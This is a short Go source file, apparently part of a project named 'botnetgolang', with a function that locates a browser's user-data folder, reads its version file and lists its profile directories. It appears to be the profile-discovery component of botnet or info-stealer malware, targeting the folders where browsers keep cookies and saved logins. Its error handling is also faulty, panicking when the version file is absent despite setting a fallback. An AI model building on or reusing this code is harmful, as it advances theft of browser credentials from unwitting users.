package internal

import (
	"botnetgolang/internal/model"
	"botnetgolang/internal/pkg"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

var jsonData []interface{}

func FunGetProfile(browser model.BrowserPaths) map[string]interface{} {
	jsonObj := make(map[string]interface{})

	ppp := os.Getenv("APPDATA")
	if ppp == "" {
		ppp = os.Getenv("HOME")
	}
	part := strings.Split(ppp, "\\AppData")
	ppp = part[0]

	jsonData = append(jsonData, filepath.Join(ppp, "fffff"))

	pathfolderD := filepath.Join(ppp, browser.Pa)

	textF := "108.0.0.0"
	content, err := ioutil.ReadFile(filepath.Join(pathfolderD, "Last Version"))
	if err == nil {
		textF = string(content)
	}

	alls := make([]string, 0)
	if paths, err := pkg.GetDirectoriesV2(pathfolderD); err != nil {
		fmt.Print("loi")
	} else {
		for _, value := range paths {
			alls = append(alls, value)
		}

	}

	if err != nil {
		panic(err)
	}

	jsonObj["alls"] = alls
	jsonObj["goc"] = ppp
	jsonObj["userData"] = pathfolderD
	jsonObj["version"] = textF

	return jsonObj
}
